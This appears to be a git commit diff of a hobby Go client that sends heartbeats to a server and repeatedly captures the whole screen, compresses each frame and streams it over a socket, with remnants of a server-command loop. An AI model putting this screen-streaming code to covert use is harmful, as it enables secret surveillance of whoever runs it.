0bc095197062b3767de469f057f8b3731cebb349
yangliangcong@chainsuns.com <ylc18320270474>
2023-02-27 23:42:02 +0800

    aaa

--- src/demo/client/ma.go
+++ src/demo/client/ma.go
@@ -53,51 +53,6 @@ func heartbeat(conn net.Conn, interval time.Duration) {
 	wg.Done() // 协程计数器加-1
 }
 
-func SendHead(Head byte, socket net.Conn) {
-	buf := make([]byte, 1)
-	buf[0] = Head
-	_, err := socket.Write(buf)
-	if err != nil {
-		fmt.Println(err)
-	}
-}
-
-func GetImage() []byte {
-	// 获取当前屏幕的截图
-	screenWidth, screenHeight := robotgo.GetScreenSize()
-	// 获取当前屏幕的截图
-	bitmap := robotgo.CaptureScreen(0, 0, screenWidth, screenHeight)
-
-	// 将 _Ctype_MMBitmapRef 转换为 image.RGBA
-	//rect := image.Rect(0, 0, screenX, screenY)
-	//rgba := image.NewRGBA(rect)
-	// 将截图转换为Image对象
-	img := robotgo.ToImage(bitmap)
-	// 创建一个PNG文件，并将Image对象保存到文件中
-	file, err := os.Create("output.png")
-	if err != nil {
-		fmt.Println("创建文件失败：", err)
-
-	}
-	defer file.Close()
-
-	if err := png.Encode(file, img); err != nil {
-		fmt.Println("保存失败：", err)
-	}
-	return nil
-}
-
-func SendScreen(conn net.Conn) {
-
-	SendHead(1, conn)
-	for {
-		time.Sleep(300 * time.Millisecond)
-		getImage := GetImage()
-
-		util.Send(2, getImage, conn)
-	}
-}
-
 func connectNew() {
 
 	wg.Add(2) // 协程计数器 +1
@@ -125,12 +80,53 @@ func connectNew() {
 
 	dataOutputStream.Flush()
 	// // 协程计数器加-1
-
-	go heartbeat(socket, time.Second)
 	go doSomeThing(socket)
+	go heartbeat(socket, time.Second)
+
 	wg.Wait() //等待协程计数器为0 退出
 	fmt.Println("abc========================")
 
+}
+func createScreen(socket net.Conn) {
+	// 获取当前屏幕的大小
+	screenWidth, screenHeight := robotgo.GetScreenSize()
+	util.SendHead(1, socket)
+	for {
+		time.Sleep(time.Millisecond * 300)
+		// 获取当前屏幕的截图
+		bitmap := robotgo.CaptureScreen(0, 0, screenWidth, screenHeight)
+
+		// 将截图转换为Image对象
+		img := robotgo.ToImage(bitmap)
+
+		// 创建一个PNG文件，并将Image对象保存到文件中
+		file, err := os.Create("output.png")
+		if err != nil {
+			fmt.Println("创建文件失败：", err)
+			return
+		}
+		defer file.Close()
+
+		if err := png.Encode(file, img); err != nil {
+			fmt.Println("保存失败：", err)
+			return
+		}
+		fmt.Println("图片保存成功..")
+		// 创建一个 bytes.Buffer 对象
+		buffer := new(bytes.Buffer)
+		// 将截图编码为 PNG 格式并写入 buffer 中
+
+		err = png.Encode(buffer, img)
+		if err != nil {
+			panic(err)
+		}
+		//// 将 buffer 转换为 byte 数组
+		byteArray := buffer.Bytes()
+		fmt.Println(len(byteArray))
+		compress := util.Compress(byteArray)
+		util.Send(2, compress, socket)
+		fmt.Println("发送成功")
+	}
 }
 
 func doSomeThing(socket net.Conn) {
@@ -143,79 +139,14 @@ func doSomeThing(socket net.Conn) {
 		fmt.Println(receiveHead)
 		switch string(receiveHead) {
 		//心跳
-		case string(10):
+		case string(0):
 			fmt.Println("heart...")
 
-		//屏幕监控
-		case string(1):
-
-			for {
-				time.Sleep(time.Second * 1)
-				// 获取当前屏幕的大小
-				screenWidth, screenHeight := robotgo.GetScreenSize()
-
-				// 获取当前屏幕的截图
-				bitmap := robotgo.CaptureScreen(0, 0, screenWidth, screenHeight)
-
-				// 将截图转换为Image对象
-				img := robotgo.ToImage(bitmap)
-
-				// 创建一个PNG文件，并将Image对象保存到文件中
-				file, err := os.Create("output.png")
-				if err != nil {
-					fmt.Println("创建文件失败：", err)
-					return
-				}
-				defer file.Close()
-
-				if err := png.Encode(file, img); err != nil {
-					fmt.Println("保存失败：", err)
-					return
-				}
-				fmt.Println("图片保存成功..")
-				// 创建一个 bytes.Buffer 对象
-				buffer := new(bytes.Buffer)
-				// 将截图编码为 PNG 格式并写入 buffer 中
-
-				err = png.Encode(buffer, img)
-				if err != nil {
-					panic(err)
-				}
-				//// 将 buffer 转换为 byte 数组
-				byteArray := buffer.Bytes()
-				util.Send(2, byteArray, socket)
-			}
-
+			//屏幕监控
+			//case string(1):
+			//	go createScreen(socket)
 		}
 	}
-
-	//for {
-	//	// IO流
-	//	fmt.Println("bbbbbbbbbb")
-	//	message, err := bufio.NewReader(socket).ReadString('\n')
-	//	fmt.Println("mesasge=======>" + message)
-	//	if err != nil {
-	//		fmt.Println(err)
-	//		// 如果服务器断开，则重新连接
-	//		socket.Close()
-	//		connectNew()
-	//	}
-	//	// 收到指令base64解码
-	//	decodedCase, _ := base64.StdEncoding.DecodeString(message)
-	//	command := string(decodedCase)
-	//	cmdParameter := strings.Split(command, " ")
-	//	switch cmdParameter[0] {
-	//	//case "back":
-	//	//	socket.Close()
-	//	//
-	//	//case "exit":
-	//	//	socket.Close()
-	//	//	os.Exit(0)
-	//	//屏幕监控
-	//	case "1":
-	//		go SendScreen(socket)
-	//	}
-	//}
 	wg.Done() // 协程计数器加-1
 
 }
--- src/demo/util/SendMessage.go
+++ src/demo/util/SendMessage.go
@@ -3,15 +3,26 @@ package util
 import (
 	"bufio"
 	"bytes"
+	"compress/gzip"
 	"compress/zlib"
 	"encoding/binary"
+	"fmt"
 	"net"
 )
+
+func Compress(context []byte) []byte {
+	var buffer bytes.Buffer
+	gzipWriter := gzip.NewWriter(&buffer)
+	gzipWriter.Write(context)
+	gzipWriter.Close()
+	return buffer.Bytes()
+}
 
 func ReceiveHead(dataInputStream *bufio.Reader) byte {
 	bytes := make([]byte, 1)
 	_, err := dataInputStream.Read(bytes)
 	if err != nil {
+		fmt.Println(err)
 		// 处理异常
 	}
 	return bytes[0]
@@ -26,20 +37,70 @@ func readByte(dataInputStream *bytes.Buffer) (byte, error) {
 	return b, nil
 }
 
-func Send(head byte, context []byte, conn net.Conn) {
-	var buffer bytes.Buffer
-	writer := zlib.NewWriter(&buffer)
-	writer.Write(context)
-	writer.Close()
-	data := buffer.Bytes()
+//
+//func Send(head byte, context []byte, conn net.Conn) {
+//	var buffer bytes.Buffer
+//	writer := zlib.NewWriter(&buffer)
+//	writer.Write(context)
+//	writer.Close()
+//	data := buffer.Bytes()
+//
+//	length := uint16(len(data))
+//	header := []byte{head, byte(length >> 8), byte(length)}
+//	packet := append(header, data...)
+//
+//	conn.Write(packet)
+//}
 
-	length := uint16(len(data))
-	header := []byte{head, byte(length >> 8), byte(length)}
-	packet := append(header, data...)
-
-	conn.Write(packet)
+func Send(head byte, context []byte, socket net.Conn) {
+	compressedData, err := compress(context)
+	if err != nil {
+		fmt.Println(err)
+		return
+	}
+	header := createHeader(head, len(compressedData))
+	_, err = socket.Write(header)
+	if err != nil {
+		fmt.Println(err)
+		return
+	}
+	_, err = socket.Write(compressedData)
+	if err != nil {
+		fmt.Println(err)
+		return
+	}
 }
 
+func createHeader(head byte, length int) []byte {
+	header := make([]byte, 3)
+	header[0] = head
+	binary.BigEndian.PutUint16(header[1:], uint16(length))
+	return header
+}
+func compress(data []byte) ([]byte, error) {
+	var buf bytes.Buffer
+	compressor, err := zlib.NewWriterLevel(&buf, zlib.BestCompression)
+	if err != nil {
+		return nil, err
+	}
+	_, err = compressor.Write(data)
+	if err != nil {
+		return nil, err
+	}
+	err = compressor.Close()
+	if err != nil {
+		return nil, err
+	}
+	return buf.Bytes(), nil
+}
+
+func SendHead(head byte, socket net.Conn) {
+	buffer := []byte{head}
+	_, err := socket.Write(buffer)
+	if err != nil {
+		fmt.Println(err)
+	}
+}
 func ToByte(args ...interface{}) []byte {
 	var buffer bytes.Buffer
 	for _, arg := range args {
